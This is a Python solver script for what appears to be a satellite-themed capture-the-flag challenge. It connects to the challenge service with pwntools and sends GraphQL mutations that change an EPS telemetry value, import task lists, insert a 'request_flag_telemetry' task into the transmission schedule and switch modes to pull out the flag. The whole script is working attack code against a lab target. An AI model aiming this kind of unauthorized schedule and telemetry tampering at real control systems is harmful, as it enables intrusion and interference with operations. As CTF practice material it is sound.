#!/usr/bin/python3

import json
import time
import os, sys
from pwnlib.tubes.remote import remote
from datetime import datetime, timedelta
import requests

def solveStageOne(iURl, iHost, iPort, critMsg):

    iheaders = {'referer': 'http://%s' % iURl, 'content-type': 'application/json'}
    url = 'http://' + iHost + ':' + iPort
    isubSys = 'eps'
    iparam = (critMsg.split(b': ')[1].split(b' ')[0]).decode('utf-8')
    ivalue = '7.5'

    payload = '{"query": "mutation{insert(subsystem: \\\"%s\\\", parameter: \\\"%s\\\", value: \\\"%s\\\"){success, errors}}"}' % (isubSys, iparam, ivalue)

    response = (requests.post(url, data=payload, headers=iheaders))
    jResponse = json.loads(response.content.decode('utf-8'))

    success = jResponse['data']['insert']['success']

    return success

def startSunPoint(sUrl, sHost, sPort, sock):
    
    iheaders = {'referer': 'http://%s' % sUrl, 'content-type': 'application/json'}
    url = 'http://' + sHost + ':' + sPort

    tWin = {'description': 'Solver', 'delay': '1s', 'app': {'name': 'sunpoint'}}

    jWin = str({'tasks': [tWin]})
    jWin = jWin.replace("'", '\\\\\\"')

    payload = '{"query": "mutation{importRawTaskList(mode: \\\"station-keeping\\\", name: \\\"hey\\\", json: \\\"%s\\\" ){success, errors}}"}' % jWin
    response = (requests.post(url, data=payload, headers=iheaders))
    jResponse = json.loads(response.content.decode('utf-8'))

    success = jResponse['data']['importRawTaskList']['success']

    response = sock.recvuntil(b'SUCCESS')

    return success

def solveStageTwo(sUrl, sHost, sPort, sock):

    iheaders = {'referer': 'http://%s' % sUrl, 'content-type': 'application/json'}
    url = 'http://' + sHost + ':' + sPort
    payload = '{"query": "{ availableModes{ name, schedule{tasks{ app{ name }, time, description }, filename } } }"}'
    
    response = (requests.post(url, data=payload, headers=iheaders))
    jResponse = json.loads(response.content.decode('utf-8'))

    if not (startSunPoint(sUrl, sHost, sPort, sock)):
        return False

    winSchedule = []
    for mode in jResponse['data']['availableModes']:
        if mode['name'] == 'transmission':
            for schedule in mode['schedule']:
                if schedule['filename'] == 'nominal-op':
                    for task in schedule['tasks']:
                        tWin = {"description": task['description']}
                        tWin['time'] = task['time']
                        tWin['app'] = {'name': task['app']['name']}
                        if tWin['app']['name'] == 'enable_downlink':
                            winTime = tWin['time']
                        winSchedule.append(tWin)

    winTime = datetime.strptime(winTime, '%Y-%m-%d %H:%M:%S') + timedelta(seconds=3)
    tWin = {'description': 'Solver', 'time': str(winTime), 'app': {'name': 'request_flag_telemetry'}}
    winSchedule.append(tWin)

    jWin = str({'tasks': winSchedule})
    jWin = jWin.replace("'", '\\\\\\"')

    payload = '{"query": "mutation{importRawTaskList(mode: \\\"transmission\\\", name: \\\"nominal-op\\\", json: \\\"%s\\\" ){success, errors}}"}' % jWin

    response = (requests.post(url, data=payload, headers=iheaders))
    jResponse = json.loads(response.content.decode('utf-8'))

    payload = '{"query": "{ availableModes{ name, schedule{tasks{ app{ name }, time, description }, filename } } }"}'
    
    response = (requests.post(url, data=payload, headers=iheaders))
    jResponse = json.loads(response.content.decode('utf-8'))

    payload = '{"query": "mutation{activateMode(name: \\\"low_power\\\"){success, errors}}"}'

    response = (requests.post(url, data=payload, headers=iheaders))
    jResponse = json.loads(response.content.decode('utf-8'))

    success = jResponse['data']['activateMode']['success']

    return success

if __name__ == '__main__':
    flag = None
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", 31555))

    sock = remote(Host, Port)
    
    ticket = os.getenv("TICKET", "")
    if len(ticket):
        sock.recv(128)
        sock.send((ticket + "\n").encode("utf-8"))

    clog = sock.recvuntil(b'/tel/graphiql')
    dclog = clog.decode("utf-8")

    telURL = dclog.find('running at: ') + len('running at: ')
    telURL = dclog[telURL:-1]                   # = 172.17.0.1:31337/tel/graphiql

    telHost = telURL.split(':')[0]              # = 172.17.0.1

    telPort = telURL.split(':')[1]
    telPort = telPort.split('/')[0]             # = 31337

    critMsg = clog.find(b'eps telemetry check.')
    critMsg = clog[critMsg:-1].split(b'\n')[1]

    success = False
    print("Starting stage_one")
    try:
        success = solveStageOne(telURL, telHost, telPort, critMsg)
    except Exception as e:
        print("FAILED: On stage_one with: " + str(e))

    if not success:
        print("FALED: stage_one")
        sys.exit(-1)

    print("Finished stage_one\n")

    clog = sock.recvuntil(b'/sch/graphiql')
    dclog = clog.decode("utf-8")

    schURL = dclog.find('successfully at: ') + len('running at: ')
    schURL = dclog[schURL:-1]                    # = 172.17.0.1:31337/sch/graphiql

    success = False
    print("Starting stage_two")

    try:
        success = solveStageTwo(schURL, telHost, telPort, sock)
    except Exception as e:
        print("FAILED: On stage_two with: " + str(e))
        sys.exit(-1)

    if not success:
        print("FAILED: stage_two")
        sys.exit(-1)

    try:
        clog = sock.recvuntil(b'Goodbye')
    except Exception as e:
        print("FAILED: Lost the game. With error: " + str(e))
        print(clog)
        sys.exit(-1)
    flagIndex = clog.find(b'\nflag')

    if flagIndex != -1:
        flag = clog[flagIndex:-1].split(b'\n')[1]
    else:
        print("FAILED: Lost the game.")
        sys.exit(-1)

    print(flag.decode('utf-8'))
